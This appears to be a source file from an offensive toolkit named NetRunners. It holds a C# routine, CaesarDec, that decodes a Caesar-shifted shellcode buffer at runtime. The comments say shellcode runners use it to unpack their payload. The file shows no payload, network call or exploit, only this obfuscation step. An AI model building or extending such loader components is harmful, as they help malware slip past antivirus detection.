using static NetRunners.Shellcode;

namespace NetRunners
{
	/// <summary>
	/// This class includes decryption routines to be used by runners when decrypting the payload at runtime.
	/// subKey is retrieved from Shellcode class
	/// </summary>
    public static class Decryptors
    {
        public static byte[] CaesarDec()
        {
			// decrypt buf, return buf for functions
			for (int i = 0; i<buf.Length; i++)
			{
				buf[i] = (byte) (((uint) buf[i] - subKey) & 0xFF);
			}
			return buf;
        }
	}
}
